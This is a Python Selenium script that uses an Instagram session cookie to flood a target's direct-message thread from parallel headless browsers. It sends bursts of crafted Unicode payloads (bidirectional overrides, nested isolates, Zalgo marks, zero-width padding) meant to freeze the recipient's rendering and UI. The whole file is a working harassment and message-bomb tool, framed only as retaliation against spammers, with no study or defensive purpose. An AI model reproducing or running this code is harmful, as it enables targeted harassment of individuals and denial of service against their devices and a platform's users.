# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (COUNTER-BLITZ V100)
# 📅 STATUS: SCREEN-CLEARER | GPU-POISON | 0.05s BURST

import os, time, random, threading, sys, gc, tempfile, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- MATRIX CONFIG ---
THREADS = 2
SESSION_LIMIT = 180 
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_counter_blitz_payload(target_name):
    """The Anti-Spammer Payload: Hijacks the target's UI focus."""
    # 💥 PHASE 1: THE SCREEN-CLEARER
    # 80 lines of space to push their spam out of view instantly.
    clearer = "\n" * 80 
    
    header = f"👑 PRAVEER PAPA 👑 COUNTER-BLITZ: [{target_name.upper()}] SHUTDOWN\n"
    
    # 💥 PHASE 2: GPU-POISON (Math Overlays + Variation Selectors)
    # Lags the keyboard and rendering engine.
    gpu_freeze = "𝔓𝔄𝔙𝔈𝔈𝔔 \ufe0f" * 40 
    
    # 💥 PHASE 3: DOM-LOCK (256-Layer Isolate Nesting)
    # Freezes the 'Send' button and UI interactions.
    dom_lock = "\u2066\u2067\u2068" * 85 
    
    # 💥 PHASE 4: SKYSCRAPER (High-Density Zalgo)
    z_tower = "̸" * 100
    
    lines = [clearer, header, gpu_freeze, dom_lock]
    for i in range(45):
        style = "\u202E" if i % 2 == 0 else "\u202D"
        lines.append(f"{style} {target_name.upper()}_MUTED {z_tower}")
    
    bloat = "\u200B" * 2500
    return "\n".join(lines) + bloat

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def run_life_cycle(agent_id, cookie, target_id, target_name):
    while True:
        driver = None
        try:
            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ COUNTER-BLITZ DEPLOYED...", flush=True)
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(6)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(12)

            session_start = time.time()
            while (time.time() - session_start) < SESSION_LIMIT:
                try:
                    box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                    
                    # 🔥 ZERO-DELAY BURST: 5 Heavy Messages in a row
                    for _ in range(5):
                        payload = get_counter_blitz_payload(target_name)
                        driver.execute_script("""
                            var el = arguments[0];
                            document.execCommand('insertText', false, arguments[1]);
                            el.dispatchEvent(new Event('input', { bubbles: true }));
                        """, box, payload)
                        box.send_keys(Keys.ENTER)
                        time.sleep(0.05) # Extreme speed
                    
                    print(f"[M{MACHINE_ID}-A{agent_id}] 💥 SHUTDOWN DELIVERED", flush=True)
                    time.sleep(random.uniform(8, 12)) 
                    
                except:
                    time.sleep(5)
                    break 
        except Exception: pass
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(3)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    if not cookie or not target_id: sys.exit(1)
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
